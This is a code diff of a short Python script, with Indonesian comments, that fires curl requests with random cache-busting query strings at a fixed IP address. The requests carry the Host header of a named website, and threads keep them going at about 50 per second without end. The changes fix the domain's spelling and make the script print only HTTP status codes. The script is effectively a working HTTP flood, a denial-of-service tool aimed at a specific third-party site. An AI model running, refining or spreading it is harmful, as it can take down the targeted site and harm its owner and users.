@@ -9,17 +9,20 @@ def random_string(length=8):
 
 def run_curl(index):
     rand = random_string()
-    url = f"http://153.92.9.237/?s={rand}"
+    url = f"http://153.92.9.237/?s={rand}"  # IP dari bisnisia.id
     cmd = [
         "curl",
         "-s",
         "-L",
-        "-H", "Host: bisinisia.id",
+        "-o", "/dev/null",  # Buang isi response
+        "-w", "%{http_code}",  # Tampilkan status HTTP saja
+        "-H", "Host: bisnisia.id",
         url
     ]
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-        print(f"[{index}] Status: {result.returncode}")
+        status_code = result.stdout.strip()
+        print(f"[{index}] HTTP Status: {status_code}")
     except Exception as e:
         print(f"[{index}] Error: {e}")
 
@@ -33,12 +36,10 @@ def run_50_curl_per_second():
             t = threading.Thread(target=run_curl, args=(counter,))
             t.start()
             threads.append(t)
-        # Tunggu semua selesai
         for t in threads:
             t.join()
         elapsed = time.time() - start
-        sleep_time = max(0, 1 - elapsed)
-        time.sleep(sleep_time)  # Jaga agar tepat 1 detik per batch
+        time.sleep(max(0, 1 - elapsed))
 
 if __name__ == "__main__":
     run_50_curl_per_second()
